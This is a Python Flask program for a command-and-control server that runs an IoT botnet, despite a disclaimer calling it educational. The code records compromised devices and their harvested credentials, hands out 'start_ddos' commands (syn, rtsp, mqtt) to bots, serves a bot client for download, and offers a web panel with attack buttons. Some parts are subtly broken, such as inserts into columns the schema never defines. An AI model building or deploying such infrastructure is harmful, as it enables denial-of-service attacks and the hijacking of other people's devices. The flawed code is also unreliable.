#!/usr/bin/env python3
"""
IoT Security Research - Command & Control Server
Educational Purpose Only - For Controlled Lab Environment
"""

from flask import Flask, request, jsonify, send_file, render_template_string
import sqlite3
import threading
import time
from datetime import datetime
import logging
from werkzeug.serving import make_server

app = Flask(__name__)

# Configure logging for research purposes
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('cnc_research.log'),
        logging.StreamHandler()
    ]
)

# Database initialization
def init_database():
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Table for compromised devices
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE,
            username TEXT,
            password TEXT,
            status TEXT DEFAULT 'offline',
            last_seen TIMESTAMP,
            infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Table for commands
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            target_ip TEXT,
            attack_type TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'pending'
        )
    ''')
    
    # Table for attack logs (scan results)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            port INTEGER,
            service TEXT,
            credentials TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

class DatabaseManager:
    def __init__(self):
        self.db_lock = threading.Lock()
    
    def get_connection(self):
        return sqlite3.connect('research_db.sqlite')
    
    def register_device(self, ip, username, password):
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ''', (ip, username, password))
                conn.commit()
                logging.info(f"Device registered: {ip} ({username})")
                return True
            except Exception as e:
                logging.error(f"Failed to register device {ip}: {e}")
                return False
            finally:
                conn.close()
    
    def update_device_status(self, ip, status):
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE ip = ?
            ''', (status, ip))
            conn.commit()
            conn.close()
    
    def get_all_devices(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def get_online_devices(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices WHERE status = "online"')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def log_attack(self, attack_type, target, participating_bots):
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attack_logs (attack_type, target, start_time, participating_bots, status)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, 'active')
            ''', (attack_type, target, participating_bots))
            attack_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return attack_id

# Global variables
db_manager = DatabaseManager()
current_attack = None
attack_status = {
    'active': False,
    'type': None,
    'target': None,
    'start_time': None,
    'participating_bots': 0
}

# Initialize database on startup
init_database()

# HTML template for web interface
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>IoT C2 Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .section { margin-bottom: 20px; padding: 20px; border: 1px solid #ddd; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f5f5f5; }
        .button { padding: 5px 10px; margin: 2px; cursor: pointer; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <div class="container">
        <h1>IoT C2 Server Control Panel</h1>
        
        <div class="section">
            <h2>Active Bots</h2>
            <table>
                <tr>
                    <th>IP Address</th>
                    <th>Status</th>
                    <th>Last Seen</th>
                    <th>Actions</th>
                </tr>
                {% for bot in bots %}
                <tr>
                    <td>{{ bot.ip }}</td>
                    <td>{{ bot.status }}</td>
                    <td>{{ bot.last_seen }}</td>
                    <td>
                        <button onclick="startAttack('{{ bot.ip }}')">Start Attack</button>
                        <button onclick="stopAttack('{{ bot.ip }}')">Stop Attack</button>
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>Scan Results</h2>
            <table>
                <tr>
                    <th>IP Address</th>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Credentials</th>
                    <th>Timestamp</th>
                </tr>
                {% for result in scan_results %}
                <tr>
                    <td>{{ result.ip }}</td>
                    <td>{{ result.port }}</td>
                    <td>{{ result.service }}</td>
                    <td>{{ result.credentials }}</td>
                    <td>{{ result.timestamp }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>Command History</h2>
            <table>
                <tr>
                    <th>Bot IP</th>
                    <th>Command</th>
                    <th>Target</th>
                    <th>Status</th>
                    <th>Timestamp</th>
                </tr>
                {% for cmd in commands %}
                <tr>
                    <td>{{ cmd.bot_ip }}</td>
                    <td>{{ cmd.command }}</td>
                    <td>{{ cmd.target }}</td>
                    <td>{{ cmd.status }}</td>
                    <td>{{ cmd.timestamp }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>

    <script>
        function startAttack(botIp) {
            const target = prompt('Enter target IP:');
            const attackType = prompt('Enter attack type (syn/rtsp/mqtt):');
            if (target && attackType) {
                fetch('/start-attack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        bot_ip: botIp,
                        target: target,
                        attack_type: attackType
                    })
                }).then(response => response.json())
                  .then(data => alert(data.message));
            }
        }

        function stopAttack(botIp) {
            fetch('/stop-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({bot_ip: botIp})
            }).then(response => response.json())
              .then(data => alert(data.message));
        }

        // Auto-refresh every 30 seconds
        setInterval(() => location.reload(), 30000);
    </script>
</body>
</html>
'''

class C2Server:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.bots = {}
        self.commands = {}
        self.scan_results = []
        self.server = None
        init_database()
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[C2 Server] {message}")
    
    def start(self):
        """Start the C2 server"""
        self.log(f"Starting C2 server on {self.host}:{self.port}")
        self.server = make_server(self.host, self.port, app)
        self.server.serve_forever()
    
    def stop(self):
        """Stop the C2 server"""
        if self.server:
            self.server.shutdown()
            self.log("C2 server stopped")

# Flask routes
@app.route('/')
def index():
    """Web interface for C2 server"""
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Get active bots
    cursor.execute('SELECT ip, status, last_seen FROM devices WHERE status = "active" ORDER BY last_seen DESC')
    bots = [{'ip': row[0], 'status': row[1], 'last_seen': row[2]} for row in cursor.fetchall()]
    
    # Get only the latest scan result for each unique IP
    cursor.execute('''
        SELECT ip, port, service, credentials, MAX(timestamp) as timestamp
        FROM attack_logs
        GROUP BY ip
        ORDER BY timestamp DESC
    ''')
    scan_results = [{'ip': row[0], 'port': row[1], 'service': row[2], 
                    'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
    
    # Get command history
    cursor.execute('SELECT id, command, target_ip, attack_type, status, timestamp FROM commands ORDER BY timestamp DESC')
    commands = [{'id': row[0], 'command': row[1], 'target': row[2], 
                'attack_type': row[3], 'status': row[4], 'timestamp': row[5]} for row in cursor.fetchall()]
    
    conn.close()
    
    return render_template_string(HTML_TEMPLATE, 
                                bots=bots, 
                                scan_results=scan_results, 
                                commands=commands)

@app.route('/bot-checkin', methods=['POST'])
def bot_checkin():
    """Handle bot check-in"""
    try:
        data = request.json
        bot_ip = data.get('ip')
        status = data.get('status', 'active')
        last_command_id = data.get('last_command_id')
        
        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400
        
        # Update bot status in database
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT OR REPLACE INTO devices (ip, status, last_seen)
                    VALUES (?, ?, datetime('now'))''', (bot_ip, status))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error in bot check-in: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-command/<bot_ip>', methods=['GET'])
def get_command(bot_ip):
    """Get command for bot"""
    try:
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        
        # Get latest command for bot
        cursor.execute('''SELECT id, command, target_ip, attack_type 
                    FROM commands 
                    WHERE target_ip = ? AND status = 'pending'
                    ORDER BY timestamp DESC LIMIT 1''', (bot_ip,))
        result = cursor.fetchone()
        
        if result:
            command_id, command, target, attack_type = result
            command_data = {
                'command_id': command_id,
                'command': command,
                'target': target,
                'attack_type': attack_type
            }
            
            # Update command status
            cursor.execute('''UPDATE commands 
                        SET status = 'executing' 
                        WHERE id = ?''', (command_id,))
            conn.commit()
            
            return jsonify(command_data)
        
        conn.close()
        return jsonify(None)
        
    except Exception as e:
        logging.error(f"Error getting command: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-attack', methods=['POST'])
def start_attack():
    """Start DDoS attack"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')
        target = data.get('target')
        attack_type = data.get('attack_type', 'syn')
        
        if not all([bot_ip, target]):
            return jsonify({'error': 'Missing required parameters'}), 400
        
        # Add command to database
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO commands 
                    (command, target_ip, attack_type, status, timestamp)
                    VALUES (?, ?, ?, 'pending', datetime('now'))''',
                 (f"start_ddos {target} {attack_type}", bot_ip, attack_type))
        conn.commit()
        conn.close()
        
        return jsonify({'message': f'Attack command sent to {bot_ip}'})
        
    except Exception as e:
        logging.error(f"Error starting attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    """Stop DDoS attack"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')
        
        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400
        
        # Add stop command to database
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO commands 
                    (command, target_ip, status, timestamp)
                    VALUES (?, ?, ?, datetime('now'))''',
                 (f"stop_ddos {bot_ip}", bot_ip, 'pending'))
        conn.commit()
        conn.close()
        
        return jsonify({'message': f'Stop command sent to {bot_ip}'})
        
    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/add-scan-result', methods=['POST'])
def add_scan_result():
    """Add scan result to database"""
    try:
        data = request.json
        required_fields = ['ip', 'port', 'service']
        
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400
        
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO attack_logs 
                    (ip, port, service, credentials, timestamp)
                    VALUES (?, ?, ?, ?, datetime('now'))''',
                 (data['ip'], data['port'], data['service'], 
                  data.get('credentials', '')))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error adding scan result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/download-bot', methods=['GET'])
def download_bot():
    """Serve bot client script"""
    try:
        return send_file('bot_client.py',
                        mimetype='text/plain',
                        as_attachment=True,
                        download_name='bot_client.py')
    except Exception as e:
        logging.error(f"Error serving bot client: {e}")
        return jsonify({'error': str(e)}), 500

def main():
    """Main entry point"""
    import argparse
    parser = argparse.ArgumentParser(description='IoT C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    args = parser.parse_args()
    
    server = C2Server(args.host, args.port)
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()

if __name__ == "__main__":
    main()